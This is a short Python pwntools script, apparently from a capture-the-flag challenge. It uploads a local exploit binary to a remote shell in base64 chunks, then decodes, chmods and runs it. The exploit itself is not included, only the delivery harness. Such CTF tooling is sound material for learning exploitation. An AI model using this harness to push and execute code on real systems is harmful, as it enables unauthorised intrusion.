from pwn import *
import tqdm
import base64

r = remote("localhost", 5000)
# solve pow and wait for remote to boot and login ctrl-c to resume uploading exploit
r.interactive()

dat = base64.b64encode(open("./exp", 'rb').read())

for i in tqdm.tqdm(range(0, len(dat), 0x100)):
    r.sendline(b'echo ' + dat[i:i+0x100] + b' >> exp.b64')
    r.recvuntil(b'$')

r.sendline(b'cat exp.b64 | base64 -d > exp')
r.recvuntil(b'$')
r.sendline(b'chmod +x exp')
r.recvuntil(b'$')
r.sendline(b'./exp')
r.interactive()
